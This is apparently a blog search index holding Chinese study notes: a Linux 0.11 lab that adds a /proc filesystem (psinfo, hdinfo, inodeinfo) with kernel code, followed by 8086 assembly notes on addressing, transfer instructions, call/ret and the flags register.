_syscall2(int,mkdir,const char*,name,mode_t,mode) _syscall3(int,mknod,const char*,filename,mode_t,mode,dev_t,dev) mkdir() 时 mode 参数的值可以是 “0755”（对应 rwxr-xr-x），表示只允许 root 用户改写此目录，其它人只能进入和读取此目录。\nprocfs 是一个只读文件系统，所以用 mknod() 建立 psinfo 结点时，必须通过 mode 参数将其设为只读。建议使用 S_IFPROC|0444 做为 mode 值，表示这是一个 proc 文件，权限为 0444（r\u0026ndash;r\u0026ndash;r\u0026ndash;），对所有用户只读。\nmknod() 的第三个参数 dev 用来说明结点所代表的设备编号。对于 procfs 来说，此编号可以完全自定义。proc 文件的处理函数将通过这个编号决定对应文件包含的信息是什么。例如，可以把 0 对应 psinfo，1 对应 meminfo，2 对应 cpuinfo。\n如此项工作完成得没有问题，那么编译、运行 0.11 内核后，用 ll /proc 可以看到：\n1 2 3 # ll /proc total 0 ?r--r--r-- 1 root root 0 ??? ?? ???? psinfo 此时可以试着读一下此文件：\n1 2 3 # cat /proc/psinfo (Read)inode-\u0026gt;i_mode=XXX444 cat: /proc/psinfo: EINVAL inode-\u0026gt;i_mode 就是通过 mknod() 设置的 mode。信息中的 XXX 和你设置的 S_IFPROC 有关。通过此值可以了解 mknod() 工作是否正常。这些信息说明内核在对 psinfo 进行读操作时不能正确处理，向 cat 返回了 EINVAL 错误。因为还没有实现处理函数，所以这是很正常的。\n这些信息至少说明，psinfo 被正确 open() 了。所以我们不需要对 sys_open() 动任何手脚，唯一要打补丁的，是 sys_read()。\n4.5 让 proc 文件可读 open() 没有变化，那么需要修改的就是 sys_read() 了。\n首先分析 sys_read（在文件 fs/read_write.c 中）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int sys_read(unsigned int fd,char * buf,int count) { struct file * file; struct m_inode * inode; // …… inode = file-\u0026gt;f_inode; if (inode-\u0026gt;i_pipe) return (file-\u0026gt;f_mode\u0026amp;1)?read_pipe(inode,buf,count):-EIO; if (S_ISCHR(inode-\u0026gt;i_mode)) return rw_char(READ,inode-\u0026gt;i_zone[0],buf,count,\u0026amp;file-\u0026gt;f_pos); if (S_ISBLK(inode-\u0026gt;i_mode)) return block_read(inode-\u0026gt;i_zone[0],\u0026amp;file-\u0026gt;f_pos,buf,count); if (S_ISDIR(inode-\u0026gt;i_mode) || S_ISREG(inode-\u0026gt;i_mode)) { if (count+file-\u0026gt;f_pos \u0026gt; inode-\u0026gt;i_size) count = inode-\u0026gt;i_size - file-\u0026gt;f_pos; if (count\u0026lt;=0) return 0; return file_read(inode,file,buf,count); } printk(\u0026#34;(Read)inode-\u0026gt;i_mode=%06o\\n\\r\u0026#34;,inode-\u0026gt;i_mode); //这条信息很面善吧？ return -EINVAL; } 显然，要在这里一群 if 的排比中，加上 S_IFPROC() 的分支，进入对 proc 文件的处理函数。需要传给处理函数的参数包括：\ninode-\u0026gt;i_zone[0]，这就是 mknod() 时指定的 dev ——设备编号 buf，指向用户空间，就是 read() 的第二个参数，用来接收数据 count，就是 read() 的第三个参数，说明 buf 指向的缓冲区大小 \u0026amp;file-\u0026gt;f_pos，f_pos 是上一次读文件结束时“文件位置指针”的指向。这里必须传指针，因为处理函数需要根据传给 buf 的数据量修改 f_pos 的值。 4.6 proc 文件的处理函数 proc 文件的处理函数的功能是根据设备编号，把不同的内容写入到用户空间的 buf。写入的数据要从 f_pos 指向的位置开始，每次最多写 count 个字节，并根据实际写入的字节数调整 f_pos 的值，最后返回实际写入的字节数。当设备编号表明要读的是 psinfo 的内容时，就要按照 psinfo 的形式组织数据。\n实现此函数可能要用到如下几个函数：\nmalloc() 函数 free() 函数 包含 linux/kernel.h 头文件后，就可以使用 malloc() 和 free() 函数。它们是可以被核心态代码调用的，唯一的限制是一次申请的内存大小不能超过一个页面。\n4.7 实现 sprintf() 函数 Linux 0.11 没有 sprintf()，可以参考 printf() 自己实现一个。\n可以借鉴如下代码：\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;stdarg.h\u0026gt; //…… int sprintf(char *buf, const char *fmt, ...) { va_list args; int i; va_start(args, fmt); i=vsprintf(buf, fmt, args); va_end(args); return i; } 4.8 cat 命令的实现 cat 是 Linux 下的一个常用命令，功能是将文件的内容打印到标准输出。\n它核心实现大体如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(int argc, char* argv[]) { char buf[513] = {\u0026#39;\\0\u0026#39;}; int nread; int fd = open(argv[1], O_RDONLY, 0); while(nread = read(fd, buf, 512)) { buf[nread] = \u0026#39;\\0\u0026#39;; puts(buf); } return 0; } 4.9 psinfo 的内容 进程的信息就来源于内核全局结构数组 struct task_struct * task[NR_TASKS] 中，具体读取细节可参照 sched.c 中的函数 schedule()。\n可以借鉴一下代码：\n1 2 3 4 for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) if (*p) (*p)-\u0026gt;counter = ((*p)-\u0026gt;counter \u0026gt;\u0026gt; 1)+...; 4.10 hdinfo 的内容 硬盘总共有多少块，多少块空闲，有多少 inode 等信息都放在 super 块中，super 块可以通过 get_super() 函数获得。\n其中的信息可以借鉴如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 struct super_block * sb; sb = get_super(inode-\u0026gt;i_dev); struct buffer_head * bh; total_blocks = sb-\u0026gt;s_nzones; for(i=0; is_zmap_blocks; i++) { bh = sb-\u0026gt;s_zmap[i]; p=(char *)bh-\u0026gt;b_data; } 5.实验步骤 1.修改include/sys/stat.h文件 增加新文件类型，在此文件内新增proc文件的宏定义以及测试宏。\n1 2 3 4 5 6 7 8 9 //已有的宏定义 #define S_IFMT 00170000 //文件类型(都是8进制表示) #define S_IFREG 0100000\t//普通文件 #define S_IFCHAR 0020000 //字符设备文件 #define S_ISREG(m) (((m) \u0026amp; S_IFMT) == S_IFREG) //测试m是否是普通文件 #define S_ISCHAR(m) (((m) \u0026amp; S_IFMT) == S_IFCHAR) //测试m是否是字符设备文件 //proc文件的宏定义/宏函数 #define S_IFPROC 0030000 #define S_ISPROC(m) (((m) \u0026amp; S_IFMT) == S_IFPROC) //测试m是否是proc文件 截图如下： 2.修改namei.c文件 文件/proc/psinfo以及/proc/hdinfo索引节点需要通过mknod()系统调用建立，这里需要让它支持新的文件类型。可直接修改fs/namei.c文件中的sys_mknod()函数的一行代码，在其中增加关于proc文件系统的判断:\n1 2 3 4 5 6 if (S_ISBLK(mode) || S_ISCHR(mode) || S_ISPROC(mode)) inode-\u0026gt;i_zone[0] = dev; // 文件系统初始化 inode-\u0026gt;i_mtime = inode-\u0026gt;i_atime = CURRENT_TIME; inode-\u0026gt;i_dirt = 1; bh = add_entry(dir,basename,namelen,\u0026amp;de); 截图如下： 3.修改init/main.c文件 main()函数在init后直接挂载了根文件系统，挂载之后就可以创建proc文件了，首先创建/proc文件目录，然后再建立该目录下的各个proc文件节点。在建立这些节点和目录时需要调用系统调用mkdir和mknod，因为初始化时在用户态了，所以不能直接调用，必须在初始化代码所在的文件中实现这两个系统调用的用户态接口。修改init/main.c，新增两个系统调用用户接口并接着修改init函数实现对其的调用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 static inline _syscall0(int,fork) static inline _syscall0(int,pause) static inline _syscall1(int,setup,void *,BIOS) static inline _syscall0(int,sync) /*新增mkdir和mknode系统调用*/ _syscall2(int,mkdir,const char*,name,mode_t,mode) _syscall3(int,mknod,const char *,filename,mode_t,mode,dev_t,dev) //....... setup((void *) \u0026amp;drive_info); (void) open(\u0026#34;/dev/tty0\u0026#34;,O_RDWR,0); (void) dup(0); (void) dup(0); mkdir(\u0026#34;/proc\u0026#34;,0755); mknod(\u0026#34;/proc/psinfo\u0026#34;,S_IFPROC|0444,0); mknod(\u0026#34;/proc/hdinfo\u0026#34;,S_IFPROC|0444,1); mknod(\u0026#34;/proc/inodeinfo\u0026#34;,S_IFPROC|0444,2); 截图如下： mkdir()时mode参数的值可以是“0755”（rwxr-xr-x），表示只允许root用户改写此目录，其它人只能进入和读取此目录。\nprocfs是一个只读文件系统，所以用mknod()建立psinfo结点时，必须通过mode参数将其设为只读。建议使用S_IFPROC|0444做为mode值，表示这是一个proc文件，权限为0444（r\u0026ndash;r\u0026ndash;r\u0026ndash;），对所有用户只读。\nmknod()的第三个参数dev用来说明结点所代表的设备编号。对于procfs来说，此编号可以完全自定义。proc文件的处理函数将通过这个编号决定对应文件包含的信息是什么。例如，可以把0对应psinfo，1对应hdinfo，2对应inodeinfo。 现在可以重新编译运行系统，使用ll /proc可观察到下面的结果：\n这些信息说明内核在对 psinfo 进行读操作时不能正确处理，向 cat 返回了 EINVAL 错误。因为还没有实现处理函数，所以这是很正常的。这些信息至少说明，psinfo被正确open()了。所以我们不需要对sys_open()动任何手脚，唯一要打补丁的，是sys_read()。\n4.修改fs/read_write.c文件 为了让proc文件可读，修改fs/read_write.c添加extern，表示proc_read函数是从外部调用的。\n1 2 /*新增proc_read函数外部调用*/ extern int proc_read(int dev,unsigned long *pos,char* buf,int count); 截图如下： 然后在sys_read函数中仿照其他if语句，加上 S_IFPROC() 的分支，添加proc文件的proc_read()调用：\n1 2 3 4 5 6 7 if (inode-\u0026gt;i_pipe) return (file-\u0026gt;f_mode\u0026amp;1)?read_pipe(inode,buf,count):-EIO; /*新增proc_read调用*/ if (S_ISPROC(inode-\u0026gt;i_mode)) return proc_read(inode-\u0026gt;i_zone[0],\u0026amp;file-\u0026gt;f_pos,buf,count); if (S_ISCHR(inode-\u0026gt;i_mode)) return rw_char(READ,inode-\u0026gt;i_zone[0],buf,count,\u0026amp;file-\u0026gt;f_pos); 截图如下： 需要传给处理函数的参数包括：\ninode-\u0026gt;i_zone[0]，这就是 mknod() 时指定的 dev ——设备编号\n\u0026amp;file-\u0026gt;f_pos，f_pos 是上一次读文件结束时“文件位置指针”的指向。这里必须传指针，因为处理函数需要根据传给 buf 的数据量修改 f_pos 的值。\nbuf，指向用户空间，用来接收数据\ncount，说明 buf 指向的缓冲区大小\n5.新增/fs/proc.c文件 proc文件的处理函数的功能是根据设备编号，把不同的内容写入到用户空间的buf。写入的数据要从 f_pos 指向的位置开始，每次最多写count个字节，并根据实际写入的字节数调整 f_pos 的值，最后返回实际写入的字节数。当设备编号表明要读的是psinfo的内容时，就要按照 psinfo 的形式组织数据。在fs目录下新增proc.c文件，文件信息如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;asm/segment.h\u0026gt; #include \u0026lt;linux/fs.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define set_bit(bitnr,addr) ({ \\ register int __res ; \\ __asm__(\u0026#34;bt %2,%3;setb %%al\u0026#34;:\u0026#34;=a\u0026#34; (__res):\u0026#34;a\u0026#34; (0),\u0026#34;r\u0026#34; (bitnr),\u0026#34;m\u0026#34; (*(addr))); \\ __res; }) char proc_buf[4096] ={\u0026#39;\\0\u0026#39;}; extern int vsprintf(char * buf, const char * fmt, va_list args); //Linux0.11没有sprintf()，该函数是用于输出结果到字符串中的，所以就实现一个，这里是通过vsprintf()实现的。 int sprintf(char *buf, const char *fmt, ...) { va_list args; int i; va_start(args, fmt); i=vsprintf(buf, fmt, args); va_end(args); return i; } int get_psinfo() { int read = 0; read += sprintf(proc_buf+read,\u0026#34;%s\u0026#34;,\u0026#34;pid\\tstate\\tfather\\tcounter\\tstart_time\\n\u0026#34;); struct task_struct **p; for(p = \u0026amp;FIRST_TASK ; p \u0026lt;= \u0026amp;LAST_TASK ; ++p) if (*p != NULL) { read += sprintf(proc_buf+read,\u0026#34;%d\\t\u0026#34;,(*p)-\u0026gt;pid); read += sprintf(proc_buf+read,\u0026#34;%d\\t\u0026#34;,(*p)-\u0026gt;state); read += sprintf(proc_buf+read,\u0026#34;%d\\t\u0026#34;,(*p)-\u0026gt;father); read += sprintf(proc_buf+read,\u0026#34;%d\\t\u0026#34;,(*p)-\u0026gt;counter); read += sprintf(proc_buf+read,\u0026#34;%d\\n\u0026#34;,(*p)-\u0026gt;start_time); } return read; } /* * 参考fs/super.c mount_root()函数 */ int get_hdinfo() { int read = 0; int i,used; struct super_block * sb; sb=get_super(0x301); /*磁盘设备号 3*256+1*/ /*Blocks信息*/ read += sprintf(proc_buf+read,\u0026#34;Total blocks:%d\\n\u0026#34;,sb-\u0026gt;s_nzones); used = 0; i=sb-\u0026gt;s_nzones; while(--i \u0026gt;= 0) { if(set_bit(i\u0026amp;8191,sb-\u0026gt;s_zmap[i\u0026gt;\u0026gt;13]-\u0026gt;b_data)) used++; } read += sprintf(proc_buf+read,\u0026#34;Used blocks:%d\\n\u0026#34;,used); read += sprintf(proc_buf+read,\u0026#34;Free blocks:%d\\n\u0026#34;,sb-\u0026gt;s_nzones-used); /*Inodes 信息*/ read += sprintf(proc_buf+read,\u0026#34;Total inodes:%d\\n\u0026#34;,sb-\u0026gt;s_ninodes); used = 0; i=sb-\u0026gt;s_ninodes+1; while(--i \u0026gt;= 0) { if(set_bit(i\u0026amp;8191,sb-\u0026gt;s_imap[i\u0026gt;\u0026gt;13]-\u0026gt;b_data)) used++; } read += sprintf(proc_buf+read,\u0026#34;Used inodes:%d\\n\u0026#34;,used); read += sprintf(proc_buf+read,\u0026#34;Free inodes:%d\\n\u0026#34;,sb-\u0026gt;s_ninodes-used); return read; } int get_inodeinfo() { int read = 0; int i; struct super_block * sb; struct m_inode *mi; sb=get_super(0x301); /*磁盘设备号 3*256+1*/ i=sb-\u0026gt;s_ninodes+1; i=0; while(++i \u0026lt; sb-\u0026gt;s_ninodes+1) { if(set_bit(i\u0026amp;8191,sb-\u0026gt;s_imap[i\u0026gt;\u0026gt;13]-\u0026gt;b_data)) { mi = iget(0x301,i); read += sprintf(proc_buf+read,\u0026#34;inr:%d;zone[0]:%d\\n\u0026#34;,mi-\u0026gt;i_num,mi-\u0026gt;i_zone[0]); iput(mi); } if(read \u0026gt;= 4000) { break; } } return read; } int proc_read(int dev, unsigned long * pos, char * buf, int count) { int i; if(*pos % 1024 == 0) { if(dev == 0) get_psinfo(); if(dev == 1) get_hdinfo(); if(dev == 2) get_inodeinfo(); } for(i=0;i\u0026lt;count;i++) { if(proc_buf[i+ *pos ] == \u0026#39;\\0\u0026#39;) break; put_fs_byte(proc_buf[i+ *pos],buf + i+ *pos); } *pos += i; return i; } 新增过程截图如下： 6.修改fs/Makefile文件 1 2 3 4 5 6 7 8 OBJS=\topen.o read_write.o inode.o file_table.o buffer.o super.o \\ block_dev.o char_dev.o file_dev.o stat.o exec.o pipe.o namei.o \\ bitmap.o fcntl.o ioctl.o truncate.o proc.o //...... ### Dependencies: proc.o : proc.c ../include/linux/kernel.h ../include/linux/sched.h \\ ../include/linux/head.h ../include/linux/fs.h ../include/sys/types.h \\ ../include/linux/mm.h ../include/signal.h ../include/asm/segment.h 截图如下： 7.运行验证 重新编译运行linux-0.11 查看psinfo(当前系统进程状态信息)和hdinfo(硬盘信息)的信息，发现符合预期。\n回答问题 meminfo，可以获得内存相关信息，看那些程序占用内存较多，方便管理。 是变化前的，==在读取位置f_pos为0时才更新psinfo内容==。 该inode对应的i_zone[0]依然存在。也就是说，只是从inode映射中取消映射该inode，但是实际上硬盘上的数据还在。 ","permalink":"https://chance7bin.github.io/posts/basic/os-lab/%E5%AE%9E%E9%AA%8C9-proc%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AE%9E%E7%8E%B0/","summary":"1.实验目的 掌握虚拟文件系统的实现原理； 实践文件、目录、文件系统等概念。 2.实验内容 /proc文件系统是了解系统信息的一个窗口，它不是普通意","title":"实验9 proc文件系统的实现"},{"content":"(1)处理的数据在什么地方？\n(2)要处理的数据有多长？\n为了描述上的简洁，使用描述性的符号 reg 来表示一个寄存器，用sreg表示一个段寄存器。\nreg 的集合包括： ax、 bx、cx、dx、ah、al、 bh、bl、ch、cl、dh、dl、sp、bp、si、di；\nsreg的集合包括： ds、ss、cs、es。\n8.1 bx、si、di和 bp (1)在8086CPU中，只有这4个寄存器可以用在“[\u0026hellip;]”中来进行内存单元的寻址。比如下面的指令都是正确的：\n而下面的指令是错误的：\n(2)在[\u0026hellip;]中，这4个寄存器可以单个出现，或只能以4种组合出现: bx和 si、bx和di、 bp和 si、bp和 di。比如下面的指令是正确的：\n下面的指令是错误的：\n(3)只要在[\u0026hellip;]中使用寄存器 bp，而指令中没有显性地给出段地址，段地址就默认在ss 中。比如下面的指令。\n8.2 机器指令处理的数据在什么地方 绝大部分机器指令都是进行数据处理的指令，处理大致可分为3类:读取、写入、运算。在机器指令这一层来讲，并不关心数据的值是多少，而关心==指令执行前一刻==，它将要处理的数据所在的位置。指令在执行前，所要处理的数据可以在3个地方:CPU内部、内存、端口(端口将在后面的课程中进行讨论)，比如表8.1中所列的指令。\n8.3 汇编语言中数据位置的表达 (1)立即数(idata)\n对于直接包含在机器指令中的数据(执行前在CPU的指令缓冲器中)，在汇编语言中称为:立即数(idata)，在汇编指令中直接给出。\n(2)寄存器\n指令要处理的数据在寄存器中，在汇编指令中给出相应的寄存器名。\n(3)段地址(SA)和偏移地址(EA)\n指令要处理的数据在内存中，在汇编指令中可用[X]的格式给出 EA，SA在某个段寄存器中。\n8.4 寻址方式 8.5 指令要处理的数据有多长 (1)通过寄存器名指明要处理的数据的尺寸。\n例如，下面的指令中，寄存器指明了指令进行的是字操作。\n下面的指令中，寄存器指明了指令进行的是字节操作。\n(2)在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或 byte。\n例如，下面的指令中，用word ptr指明了指令访问的内存单元是一个字单元。\n下面的指令中，用byte ptr指明了指令访问的内存单元是一个字节单元。\n(3)其他方法\n有些指令默认了访问的是字单元还是字节单元，比如，push [1000H]就不用指明访问的是字单元还是字节单元，因为==push指令只进行字操作==。\n8.6 寻址方式的综合应用 C语言版本：\n汇编语言版本：\n一般来说，我们可以用[bx+idata+si]的方式来访问结构体中的数据。用bx定位整个结构体，用idata定位结构体中的某一个数据项，用si定位数组项中的每个元素。为此，汇编语言提供了更为贴切的书写方式，如:[bx].idata、[bx].idata[si]。\n8.7 div指令 (1)除数：有8位和16位两种，在一个reg 或内存单元中。\n(2)被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。\n(3）结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数;如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。\n编程，利用除法指令计算100001/100。\n编程，利用除法指令计算1001/100。\n8.8 伪指令dd 前面我们用db和dw定义字节型数据和字型数据。dd是用来定义 dword(double word，双字)型数据的。\n第一个数据为01H，在 data:0处，占1个字节;\n第二个数据为0001H，在data:1处，占1个字;\n第三个数据为00000001H，在 data:3处，占2个字。\n8.9 dup ==实验 寻址方式在结构化数据访问中的应用== P172\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC8%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/","summary":"(1)处理的数据在什么地方？ (2)要处理的数据有多长？ 为了描述上的简洁，使用描述性的符号 reg 来表示一个寄存器，用sreg表示一个段寄存器。 reg 的","title":"第8章 数据处理的两个基本问题"},{"content":"==可以修改IP，或同时修改CS 和IP的指令统称为转移指令。==概括地讲，转移指令就是可以控制CPU执行内存中某处代码的指令。\n8086CPU的转移行为有以下几类。\n只修改IP时，称为段内转移，比如: jmp ax。 同时修改CS和IP时，称为段间转移，比如: jmp 1000:0。 由于转移指令对IP的修改范围不同，段内转移又分为：短转移和近转移。\n短转移IP的修改范围为-128~127。 近转移IP的修改范围为-32768~32767。 8086CPU的转移指令分为以下几类。\n无条件转移指令(如: jmp) 条件转移指令 循环指令(如: loop)过程 中断 操作符offset\n操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。\njmp short 标号(转到标号处执行指令)\n这种格式的jmp指令实现的是段内短转移，它对IP的修改范围为-128~127\n在jmp short 标号指令所对应的机器码中，并不包含转移的目的地址，而包含的是转移的位移。这个位移，是编译器根据汇编指令中的“标号”计算出来的\njmp far ptr 标号实现的是段间转移，又称为远转移\njmp word ptr 内存单元地址(段内转移)\n从内存单元地址处开始存放着一个字，是转移的目的偏移地址\njmp dword ptr内存单元地址(段间转移)\n从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址。\n(CS)=(内存单元地址+2)\n(IP)=(内存单元地址)\njcxz指令\njcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为:-128~127。\njcxz 标号 的功能相当于 if((cx)==0) jmp short 标号;\nloop指令\nloop指令为循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为:-128~127。\nloop 标号 的功能相当于; (cx)—-; if((cx)≠0) jmp short标号;\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC9%E7%AB%A0-%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/","summary":"==可以修改IP，或同时修改CS 和IP的指令统称为转移指令。==概括地讲，转移指令就是可以控制CPU执行内存中某处代码的指令。 8086CPU","title":"第9章 转移指令的原理"},{"content":"call和 ret 指令都是转移指令，它们都修改IP，或同时修改CS 和IP。它们经常被共同用来实现子程序的设计。\nret和retf ret指令用栈中的数据，修改IP的内容，从而实现近转移;\nretf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。\nCPU执行ret指令时，相当于进行:\npop IP\nCPU执行retf指令时，相当于进行:\npop IP\npop cs\ncall指令 CPU执行call 指令时，进行两步操作:\n(1)将当前的IP或CS和IP压入栈中;\n(2)转移。\ncall 标号(将当前的IP压栈后，转到标号处执行指令)\n相当于进行：\npush IP jmp near ptr 标号\ncall far ptr 标号实现的是段间转移。\n相当于进行：\npush cs\npush IP\njmp far ptr 标号\ncall 16 位 reg\n相当于进行：\npush IP\njmp 16位 reg\ncall word ptr 内存单元地址\n相当于进行：\npush IP\njmp word ptr 内存单元地址\ncall dword ptr 内存单元地址\n相当于进行：\npush cs\npush IP\njmp dword ptr 内存单元地址\ncall和ret的配合使用 mul指令 (1)两个相乘的数:两个相乘的数，要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认在AX中，另一个放在16位reg 或内存字单元中。\n(2)结果：如果是8位乘法，结果默认放在AX中;如果是16位乘法，结果高位默认在DX中存放，低位在AX中放。\nmul byte ptr ds: [0]\n含义:(ax)=(al)*((ds)*16+0);\n模块化程序设计 将data 段中的字符串全部转化为大写。\n==这个程序在思想上完全正确，但在细节上却有些错误==\n问题在于cx的使用，主程序要使用cx记录循环次数，可是子程序中也使用了cx，在执行子程序的时候，cx中保存的循环计数值被改变，使得主程序的循环出错。（寄存器冲突）\n解决这个问题的简捷方法是，在子程序的开始将子程序中所有用到的寄存器中的内容都保存起来，在子程序返回前再恢复。可以用栈来保存寄存器中的内容。\n以后，我们编写子程序的标准框架如下：\n改进一下子程序capital的设计：\n==实验10 编写子程序== P206\n1.显示字符串\n2.解决除法溢出的问题\n3.数值显示\n课程设计1\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC10%E7%AB%A0-call%E5%92%8C-ret%E6%8C%87%E4%BB%A4/","summary":"call和 ret 指令都是转移指令，它们都修改IP，或同时修改CS 和IP。它们经常被共同用来实现子程序的设计。 ret和retf ret指令用栈中的数","title":"第10章 CALL和 RET指令"},{"content":"CPU内部的寄存器中，有一种特殊的寄存器(对于不同的处理机，个数和结构都可能不同)具有以下3种作用。\n(1)用来存储相关指令的某些执行结果;\n(2)用来为CPU执行相关指令提供行为依据;\n(3)用来控制CPU的相关工作方式。\n这种特殊的寄存器在8086CPU中，被称为标志寄存器。\nflag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息。\n8086CPU的flag寄存器的结构如图11.1所示。\nflag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11位都具有特殊的含义。\n11.1 ZF标志 flag的第6位是ZF，零标志位。它记录相关指令执行后，其结果是否为0。如果结果为0，那么zf=1;如果结果不为0，那么zf=0。\n11.2 PF标志 flag 的第⒉位是PF，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。如果1的个数为偶数，pf=1，如果为奇数，那么pf=0。\n11.3 SF标志 flag 的第7位是SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果结果为负，sf=1;如果非负，sf=0。\n11.4 CF标志 flag的第0位是CF，进位标志位。一般情况下，在进行==无符号数==运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。\n11.5 OF标志 flag 的第11位是OF，溢出标志位。一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF=1；如果没有，OF=O。\n一定要注意CF和 OF的区别:CF是对无符号数运算有意义的标志位，而OF是对有符号数运算有意义的标志位。\n11.6 adc指令 adc是带进位加法指令，它利用了CF位上记录的进位值。\n指令格式： adc 操作对象1，操作对象2\n功能：操作对象1=操作对象1＋操作对象2＋CF\n比如指令 adc ax,bx 实现的功能是：(ax)=(ax)+(bx)+CF\nadc指令和add指令相配合就可以对更大的数据进行加法运算。\n11.7 sbb指令 sbb是带借位减法指令，它利用了CF位上记录的借位值。\n指令格式： sbb 操作对象1，操作对象2\n功能：操作对象1=操作对象1-操作对象2-CF\n比如指令sbb ax,bx实现的功能是:(ax)=(ax)-(bx)-CF\n11.8 cmp指令 cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果。\ncmp指令格式：cmp 操作对象1，操作对象2\n功能：计算操作对象1-操作对象但并不保存结果，仅仅根据计算结果对标志寄存器进行设置。\n比如，指令cmp ax,ax，做(ax)-(ax)的运算，结果为0，但并不在 ax 中保存，仅影响flag的相关各位。指令执行后：zf=1，pf=1，sf=0，cf=0，of=0。\n11.9 检测比较结果的条件转移指令 因为 cmp 指令可以同时进行两种比较，无符号数比较和有符号数比较，所以根据cmp 指令的比较结果进行转移的指令也分为两种，即根据无符号数的比较结果进行转移的条件转移指令(它们检测zf、cf 的值)和根据有符号数的比较结果进行转移的条件转移指令(它们检测sf、of和zf的值)。\n下面是常用的根据无符号数的比较结果进行转移的条件转移指令。\n这些指令比较常用，它们都很好记忆，它们的第一个字母都是 j，表示 jump；后面的字母表示意义如下。\n编程，统计data段中数值为8的字节的个数，用ax保存统计结果。\n这个程序也可以写成这样：\n11.10 DF标志和串传送指令 flag 的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si、di的增减。\ndf=0 每次操作后si、di递增; df=1 每次操作后si、di递减。\n格式：movsb\n功能：执行movsb指令相当于进行下面几步操作。\n(1) ((es)*16+(di))=((ds)*16+(si))\n(2)如果df=0 则：\n(si)=(si)+1\n(di)-(di)+1\n如果df=1则： (si)=(si)-1\n(di)=(di)-1\n也可以传送一个字，指令如下。\n格式：movsw\nmovsw的功能是将ds:si指向的内存字单元中的字送入es:di 中，然后根据标志寄存器df位的值，将si和di递增2或递减2。\nmovsb和movsw进行的是串传送操作中的一个步骤，一般来说，movsb和movsw都和rep配合使用，格式如下:\nrep movsb\n用汇编语法来描述 rep movsb 的功能就是：\ns:movsb\nloop s\n可见，rep的作用是根据cx的值，重复执行后面的串传送指令。由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送。\n同理，也可以使用这样的指令:rep movsw。\n由于flag的df位决定着串传送指令执行后，si和di改变的方向，所以CPU应该提供相应的指令来对df位进行设置，从而使程序员能够决定传送的方向。\n8086CPU提供下面两条指令对df位进行设置。\ncld指令：将标志寄存器的df位置0\nstd 指令：将标志寄存器的df位置1\n编程，用串传送指令，将data 段中的第一个字符串复制到它后面的空间中。\n11.11 pushf和popf pushf的功能是将标志寄存器的值压栈，而popf是从栈中弹出数据，送入标志寄存器中。\npushf和popf，为直接访问标志寄存器提供了一种方法。\n11.12 标志寄存器在Debug中的表示 在 Debug 中，标志寄存器是按照有意义的各个标志位单独表示的。在 Debug 中，我们可以看到下面的信息。\n下面列出 Debug对我们已知的标志位的表示。\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC11%E7%AB%A0-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/","summary":"CPU内部的寄存器中，有一种特殊的寄存器(对于不同的处理机，个数和结构都可能不同)具有以下3种作用。 (1)用来存储相关指令的某些执行结果; (","title":"第11章 